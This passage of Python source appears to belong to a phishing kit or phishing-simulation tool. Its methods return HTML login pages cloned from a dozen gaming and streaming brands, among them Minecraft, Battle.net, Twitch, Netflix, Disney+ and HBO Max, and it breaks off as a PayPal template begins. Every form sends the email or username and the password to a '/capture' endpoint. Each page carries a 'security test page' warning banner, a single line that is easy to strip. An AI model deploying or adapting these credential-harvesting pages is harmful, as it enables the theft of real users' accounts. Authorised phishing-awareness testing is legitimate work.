        body { font-family: 'Minecraft', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #1a1a1a; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 200px; height: 60px; }
        .login-box { background: #2d2d2d; border: 4px solid #4c4c4c; border-radius: 8px; padding: 40px; box-shadow: 0 4px 16px rgba(0,0,0,0.5); }
        h1 { font-size: 24px; margin-bottom: 30px; color: #fff; text-align: center; text-shadow: 2px 2px 0 #000; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; color: #aaa; font-size: 14px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; background: #1a1a1a; border: 2px solid #4c4c4c; color: #fff; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #7b7b7b; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        .remember label { color: #aaa; font-size: 14px; }
        button { width: 100%; padding: 12px; background: #5a8c5a; border: 2px solid #6b9b6b; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; text-transform: uppercase; }
        button:hover { background: #6b9b6b; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #aaa; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #aaa; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #332211; border: 2px solid #7b7b7b; color: #ffaa66; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 200 60"><text x="20" y="40" fill="#5a8c5a" font-size="32" font-weight="bold">MINECRAFT</text></svg></div>
        <div class="login-box">
            <h1>SIGN IN TO MINECRAFT</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><label>MINECRAFT EMAIL</label><input type="text" name="email" placeholder="email@example.com" required></div>
                <div class="form-group"><label>PASSWORD</label><input type="password" name="password" placeholder="••••••••" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">SIGN IN</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Create account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_origin_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Origin - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Origin Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #161616; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #f56c2d; font-size: 36px; font-weight: 700; }
        .login-box { background: #262626; border-radius: 8px; padding: 40px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
        h2 { font-size: 24px; margin-bottom: 30px; color: #fff; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; background: #333; border: 1px solid #444; border-radius: 4px; color: #fff; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #f56c2d; }
        input::placeholder { color: #999; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        .remember label { color: #ccc; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #f56c2d; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #e65c1d; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #f56c2d; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #f56c2d; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #332211; border: 1px solid #f56c2d; border-radius: 4px; color: #ffaa66; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><h1>ORIGIN</h1></div>
        <div class="login-box">
            <h2>Sign In to Origin</h2>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Sign In</button>
                <div class="links"><a href="#">Forgot your password?</a></div>
            </form>
            <div class="signup"><a href="#">Create an account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_ubisoft_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Ubisoft Connect</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Ubisoft Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #010101; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 150px; height: 50px; }
        .login-box { background: #1e1e1e; border-radius: 8px; padding: 40px; box-shadow: 0 4px 16px rgba(0,0,0,0.5); }
        h1 { font-size: 24px; margin-bottom: 30px; color: #fff; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; background: #333; border: 1px solid #444; border-radius: 4px; color: #fff; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0e7ad3; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        .remember label { color: #aaa; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #0e7ad3; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #0c65b3; }
        .qr-login { text-align: center; margin: 20px 0; }
        .qr-login a { color: #0e7ad3; text-decoration: none; font-size: 14px; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #0e7ad3; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; }
        .signup a { color: #0e7ad3; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #331d0e; border: 1px solid #0e7ad3; border-radius: 4px; color: #99ccff; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 150 50"><text x="20" y="35" fill="white" font-size="24" font-weight="bold">UBISOFT</text></svg></div>
        <div class="login-box">
            <h1>Sign in to Ubisoft</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Sign In</button>
                <div class="qr-login"><a href="#">Sign in with QR code</a></div>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Create an account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_battlenet_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Battle.net - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Blizzard', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #0b1a26; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #00aeff; font-size: 32px; font-weight: 700; }
        .login-box { background: #1e2a36; border-radius: 8px; padding: 40px; box-shadow: 0 4px 16px rgba(0,0,0,0.5); }
        h2 { font-size: 24px; margin-bottom: 30px; color: #fff; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; background: #2a3846; border: 1px solid #3a4856; border-radius: 4px; color: #fff; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #00aeff; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        .remember label { color: #aaa; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #00aeff; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #0099e6; }
        .authenticator { text-align: center; margin: 20px 0; }
        .authenticator a { color: #00aeff; text-decoration: none; font-size: 14px; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #00aeff; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; }
        .signup a { color: #00aeff; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #332211; border: 1px solid #00aeff; border-radius: 4px; color: #99ccff; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><h1>BATTLE.NET</h1></div>
        <div class="login-box">
            <h2>Sign In</h2>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Sign In</button>
                <div class="authenticator"><a href="#">Use authenticator app</a></div>
                <div class="links"><a href="#">Can't log in?</a></div>
            </form>
            <div class="signup"><a href="#">Create a free account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_twitch_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Twitch</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Roobert', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #0e0e10; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 120px; height: 50px; }
        .login-box { background: #18181b; border-radius: 8px; padding: 40px; box-shadow: 0 4px 16px rgba(0,0,0,0.5); }
        h1 { font-size: 24px; margin-bottom: 30px; color: #efeff1; text-align: center; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; background: #0e0e10; border: 1px solid #2f2f35; border-radius: 4px; color: #efeff1; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #9147ff; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        .remember label { color: #adadb8; font-size: 14px; }
        button { width: 100%; padding: 12px; background: #9147ff; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #7c3ad0; }
        .qr-login { text-align: center; margin: 20px 0; }
        .qr-login a { color: #bf94ff; text-decoration: none; font-size: 14px; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #bf94ff; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; }
        .signup a { color: #bf94ff; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #2d1b33; border: 1px solid #9147ff; border-radius: 4px; color: #bf94ff; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 120 50"><text x="20" y="35" fill="#9147ff" font-size="24" font-weight="bold">Twitch</text></svg></div>
        <div class="login-box">
            <h1>Log in to Twitch</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Log In</button>
                <div class="qr-login"><a href="#">Log in with QR code</a></div>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Sign up</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    # ==================== STREAMING TEMPLATES ====================
    
    def _get_netflix_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Netflix</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 450px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 200px; height: 60px; }
        .login-box { background: rgba(0,0,0,0.75); border-radius: 8px; padding: 60px 68px 40px; }
        h1 { color: #fff; font-size: 32px; font-weight: 700; margin-bottom: 28px; }
        .form-group { margin-bottom: 16px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 16px; background: #333; border: none; border-radius: 4px; color: #fff; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { background: #454545; }
        input::placeholder { color: #8c8c8c; }
        button { width: 100%; padding: 16px; background: #e50914; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer; margin: 24px 0 12px; }
        button:hover { background: #f40612; }
        .help { display: flex; justify-content: space-between; color: #b3b3b3; font-size: 13px; }
        .remember { display: flex; align-items: center; }
        .remember input { margin-right: 5px; }
        .need-help a { color: #b3b3b3; text-decoration: none; }
        .signup { margin-top: 40px; color: #737373; font-size: 16px; }
        .signup a { color: #fff; text-decoration: none; font-weight: 500; }
        .recaptcha { margin-top: 20px; color: #8c8c8c; font-size: 13px; }
        .recaptcha a { color: #0071eb; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #331111; border: 1px solid #e50914; border-radius: 4px; color: #ff9999; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 200 60"><text x="20" y="40" fill="#e50914" font-size="36" font-weight="bold">NETFLIX</text></svg></div>
        <div class="login-box">
            <h1>Sign In</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Sign In</button>
                <div class="help"><div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div><div class="need-help"><a href="#">Need help?</a></div></div>
            </form>
            <div class="signup">New to Netflix? <a href="#">Sign up now</a></div>
            <div class="recaptcha">This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more</a>.</div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_spotify_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Spotify - Log In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Circular', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #1db954 0%, #191414 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 200px; height: 60px; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        h1 { font-size: 28px; margin-bottom: 30px; color: #191414; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #1db954; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        button { width: 100%; padding: 14px; background: #1db954; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #1ed760; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #1db954; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #1db954; text-decoration: none; font-weight: 600; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 200 60"><text x="20" y="40" fill="white" font-size="28" font-weight="bold">Spotify</text></svg></div>
        <div class="login-box">
            <h1>Log in to Spotify</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address or username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Log In</button>
                <div class="links"><a href="#">Forgot your password?</a></div>
            </form>
            <div class="signup"><a href="#">Sign up for Spotify</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_hulu_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Hulu - Log In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Graphik', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #1ce783 0%, #0b2b26 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 150px; height: 50px; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        h1 { font-size: 28px; margin-bottom: 30px; color: #1f1f1f; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #1ce783; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        button { width: 100%; padding: 14px; background: #1ce783; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #16c56e; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #1ce783; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #1ce783; text-decoration: none; font-weight: 600; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 150 50"><text x="20" y="35" fill="white" font-size="28" font-weight="bold">hulu</text></svg></div>
        <div class="login-box">
            <h1>Log In</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Log In</button>
                <div class="links"><a href="#">Forgot email or password?</a></div>
            </form>
            <div class="signup"><a href="#">Start your free trial</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_disneyplus_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Disney+ - Log In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Avenir Next', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #1a0b2e 0%, #09343b 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 180px; height: 60px; }
        .login-box { background: #1a1e2a; border-radius: 12px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        h1 { font-size: 24px; margin-bottom: 30px; color: #fff; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; background: #2a2e3a; border: 1px solid #3a3e4a; border-radius: 4px; color: #fff; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0063e5; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        .remember label { color: #aaa; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #0063e5; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #0053c2; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #0063e5; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #0063e5; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #332211; border: 1px solid #0063e5; border-radius: 4px; color: #99ccff; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 180 60"><text x="20" y="40" fill="white" font-size="28" font-weight="bold">Disney+</text></svg></div>
        <div class="login-box">
            <h1>Log in</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Log In</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Sign up for Disney+</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_hbomax_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>HBO Max - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Circular', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #6a1b9a 0%, #38006b 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 180px; height: 60px; }
        .login-box { background: #0b0c0f; border-radius: 8px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        h1 { font-size: 28px; margin-bottom: 30px; color: #fff; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; background: #1a1c22; border: 1px solid #2a2c32; border-radius: 4px; color: #fff; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #6a1b9a; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        .remember label { color: #aaa; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #6a1b9a; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #4a1375; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #6a1b9a; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #6a1b9a; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #331d33; border: 1px solid #6a1b9a; border-radius: 4px; color: #cc99ff; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 180 60"><text x="20" y="40" fill="white" font-size="28" font-weight="bold">HBO MAX</text></svg></div>
        <div class="login-box">
            <h1>Sign In</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Sign In</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Sign up for HBO Max</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_peacock_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Peacock - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Graphik', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #0b3b5c 0%, #001e3c 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 200px; height: 60px; }
        .login-box { background: #0d1b2a; border-radius: 8px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        h1 { font-size: 28px; margin-bottom: 30px; color: #fff; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; background: #1a2b3a; border: 1px solid #2a3b4a; border-radius: 4px; color: #fff; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #00dc82; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        .remember label { color: #aaa; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #00dc82; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #00bc6e; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #00dc82; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #00dc82; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #1d3327; border: 1px solid #00dc82; border-radius: 4px; color: #99ffcc; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 200 60"><text x="20" y="40" fill="white" font-size="28" font-weight="bold">PEACOCK</text></svg></div>
        <div class="login-box">
            <h1>Sign In</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Sign In</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Sign up for Peacock</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_paramount_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Paramount+ - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #0063b0 0%, #003c6c 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 200px; height: 60px; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
        h1 { font-size: 28px; margin-bottom: 30px; color: #1a1a1a; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0063b0; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        button { width: 100%; padding: 14px; background: #0063b0; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #004c8a; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #0063b0; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #0063b0; text-decoration: none; font-weight: 600; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 200 60"><text x="20" y="40" fill="white" font-size="28" font-weight="bold">PARAMOUNT+</text></svg></div>
        <div class="login-box">
            <h1>Sign In</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Sign In</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Start your free trial</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    # ==================== FINANCE TEMPLATES ====================
    
    def _get_paypal_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>PayPal - Log In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
